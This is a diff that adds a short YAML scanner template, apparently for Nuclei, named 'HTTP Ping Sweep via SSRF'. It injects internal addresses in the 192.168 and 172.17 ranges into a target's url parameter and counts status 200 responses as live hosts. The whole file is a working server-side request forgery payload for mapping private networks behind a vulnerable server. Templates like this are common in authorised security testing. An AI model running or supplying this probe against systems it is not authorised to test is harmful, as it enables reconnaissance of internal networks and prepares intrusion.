@@ -1,0 +1,20 @@
+id: ssrf-network-scan
+
+info:
+  name: HTTP Ping Sweep via SSRF
+  author: Jake Lo.ai
+  severity: info
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://{{subnet}}.{{host}}:80"
+
+    payloads:
+      subnet: ["192.168.1", "192.168.0", "172.17.0"]
+      host: ["1", "2", "3", "254"] # Simplified for brevity
+
+    matchers:
+      - type: status
+        status:
+          - 200
